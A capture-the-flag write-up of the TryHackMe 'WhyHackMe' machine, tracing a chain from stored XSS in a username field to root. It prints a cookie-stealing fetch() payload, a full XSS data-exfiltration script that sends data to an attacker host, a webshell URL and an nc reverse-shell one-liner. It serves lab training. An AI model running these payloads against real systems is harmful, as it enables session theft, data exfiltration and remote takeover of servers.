**WhyHackMe** is a **medium difficulty** machine from **TryHackMe** which involves exfiltrating a sensitive file from the server using stored XSS to gain foothold. Later using iptables we modify a rule to allow incoming traffic via a certain port in which the attacker had uploaded a web shell to run system commands. Then by decrypting a .pcap file, we find the endpoint containing the backdoor & with the help of that we gain a shell as _www-data_ user where the user has sudo permissions.

## FTP

I'll login to the FTP server since it has anonymous login enabled. There we find a file called `update.txt`.
```bash

```

`update.txt` has the following message from admin.
> Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is
> only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account.
> -> admin

This made me wonder if there would be a possible SSRF on the website at port 80.

## Website -  TCP 80

It is a blog site.

![header](img/website1.png#center)

Scrolling down the page we find a comment section. We need to log in to comment on the site. There is also a comment from admin stating that he would be going through all the comments made by the user. So this means there is somewhere a stored XSS vulnerability that can be exploited.

![header](img/website2.png#center)

So I tried to login to the site using the usernames that we encountered - **admin**, **mike** along some common weak passwords. It didn't work.
Even tried sql injection , that too yielded nothing.

Remember there was a `register.php` page found during directory bruteforcing. So I registered as a user & logged in.

![header](img/website3.png#center)


# Shell as Jack 

Initially I tried injecting several XSS payloads into the comment field but failed to execute my malicious js code.

![header](img/website4.png#center)

While it is sure that a stored XSS vulnerability exists, the challenge lies in determining which specific user input is susceptible to exploitation! 

There are only 2 places where the application accepts user i/p.
- Comments
- User registration

Now I tried to register as another user with the username - `<script>alert()</script>` & then logged in. 

![header](img/website5.png#center)

After posting a comment , I got what I expected. An alert box popped up!

![header](img/website6.png#center)

## Stealing admin's cookies

So I went again and re-registered with a user but this time with the following payload to steal admin's cookie.
```js
<script> fetch('http://ckfdjunpvhqdbictkgyyupea6j4xms37x.oast.fun', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```

So now when the admin views our comment, the username field is vulnerable to XSS, it will execute my malicious code to steal admin's cookies & send it to my [interact.sh](https://app.interactsh.com/#/) server which is an open-source alternative to Burp-Collaborator.

![header](img/steal-cookie.png#center)

I have now successfully stolen the admin's session cookie -`x73smx4j6aepuyygktcibdqhvpnujdfkc`

I tried to replace my sesion cookie with that of with admin's. But nothing worked. I was stuck here & then later I remembered about the note that admin had left. The **127.0.0.1/dir/pass.txt** file has credentials of new account.

## Exfiltrate data using XSS

Googling for ways to access files via XSS, I came across a blog by **Trustedsec** which explained how we could use stored XSS to exfiltrate data using XSS.

> Link to blog - [https://trustedsec.com/blog/simple-data-exfiltration-through-xss](https://trustedsec.com/blog/simple-data-exfiltration-through-xss) 

The following is the `exfilPayload.js` script mentioned in the blog to exfiltrate data from the server.
```js
// TrustedSec Proof-of-Concept to steal 
// sensitive data through XSS payload


function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}


function stealData()
{
	var uri = "/dir/pass.txt";

	xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			// We have the response back with the data
			var dataResponse = read_body(xhr);


			// Time to exfiltrate the HTML response with the data
			var exfilChunkSize = 2000;
			var exfilData      = btoa(dataResponse);
			var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
			var remainderBits  = exfilData.length % exfilChunkSize;

			// Exfil the yummies
			for (i = 0; i < numFullChunks; i++)
			{
				console.log("Loop is: " + i);

				var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));

				// Let's use an external image load to get our data out
				// The file name we request will be the data we're exfiltrating
				var downloadImage = new Image();
				downloadImage.onload = function()
				{
					image.src = this.src;
				};

				// Try to async load the image, whose name is the string of data
				downloadImage.src = "http://<attacker-ip>/exfil/" + i + "/" + exfilChunk + ".jpg";
			}

			// Now grab that last bit
			var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);
			var downloadImage = new Image();
			downloadImage.onload = function()
			{
    			image.src = this.src;   
			};

			downloadImage.src = "http://<attacker-ip>/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
			console.log("Done exfiling chunks..");
		}
	}
}

stealData();
```
> Note - Make sure to replace **<attacker-ip>** with your  **<tun0-ip>**.

So inorder for the exploit to work , we need to create a user with the following xss payload as username. 
```js
<script src="http://<attacker-ip>/exfilPayload.js"></script>
```

We then need to serve the `exfilPayload.js` file using **python http server** from our machine. 

So the scenario is like -

- Admin views our comment & the malicious script gets executed.
- As a result the script makes the server retreive the **exfilPayload.js** file from our python hosted server & executes it.
- Once our malicous script gets excecuted I will receive the contents of `127.0.0.1/dir/pass.txt` in base64 format to our http server.


Upon performing the above steps, I got the contents of the `/dir/pass.txt`.

```bash
sh3bu@Ubuntu:~/thm/whyhackme$ sudo python3 -m http.server 80

```

Notice the second data we've received. Decoding it by base64 I got the creds for the user `**jack**`
```bash
sh3bu@Ubuntu:~/thm/whyhackme$ echo "amFjazpXa********uZ0lESwo=" | base64 -d 
jack:Why********IDK
```

With the creds obtained I was able to ssh in as **Jack** & grab the `user.txt` flag 🚩.

````
The output suggests that there is an active service running on port 41312. Since the incoming packets to that port is dropped, our Nmap scan didn't pick it up.

Upon accessing it from our attacker machine, it says **Bad request** as response. This is because the iptables rule is configured to drop incoming packets.

So using iptables, we can change the rule to accept all incoming connections to port 41312 using the following command.
```bash
sudo iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
```
Now if I performed an Nmap scan on that port, we find that it is also running an **Apache http server**.

Now when we try to access it from attacking machine, we get a **403 Forbidden** message.

![header](img/forbidden.png#center)

Enumerating further, in the **/opt** directory there are 2 interesting files. I transferred it to my machine to analyse them.
```
jack@ubuntu:/$ ls /opt
capture.pcap  urgent.txt
```
## urgent.txt

The **urgent.txt** had the following message by admin.
> Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and
> help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting
> these files first.

When I checked the `/usr/lib/cgi-bin` directory, I saw that it was owned by user `h4cked` and thus the user `jack` can't cd into the directory & view the files inside.
```bash
jack@ubuntu:/var/www/html$ ls  -al /usr/lib/ | grep "cgi-bin"
drwxr-x---  2 root h4ck3d   4096 Aug 16 14:29 cgi-bin
```
## capture.pcap

Next up I opened **capture.pcap** using wireshark. But the contents were encrypted.

![header](img/encrypted-traffic.png#center)

In order to view the decrypted packets, we need to find the private key file in the victim machine. So using _find_ command, I was able to find the location where the priv-key is stored.

```bash
jack@ubuntu:~$ find / -type f -name "*.key" 2>/dev/null
/etc/apache2/certs/apache.key
```
I transferred it to my machine and decrypted the traffic by navigating to **Edit -> Prefernces -> TLS** . Click on **Edit** option in **RSA Keys List** & enter the IP, port, protocol & location of the private key.

![header](img/keys.png#center)

Now when we click OK, we should have the packets decrypted.

Now we set the wireshark filter to **http** to view only the HTTP packets.

![header](img/http.png#center)

From the packets, it is clear that the attacker has uploaded a webshell as backdoor `/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id` to gain access to the system.

From the attacker machine, I could access the RCE backdoor webshell by providing the full path.

> Note - Even though we get a 403 Forbidden page, there are high chances some directories/files can still be accessed by directly visiting the endpoint containing the file/directory. The files/directories can be found by brute forcing! 
> In our case, we got to know about the backdoor web shell via Wireshark packet capture.

Now in the `&cmd=` parameter I used the following reverse shell payload (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.105.88 8888 >/tmp/f`) to get a shell as www-data(which also had gid of h4cked).

The `www-data` user had the privilege to run any command as any user!
```bash
(remote) www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

Now we can easily grab the **root.txt** 🚩.
```
(remote) www-data@ubuntu:/usr/lib/cgi-bin$ sudo wc -c /root/root.txt
33 /root/root.txt
```
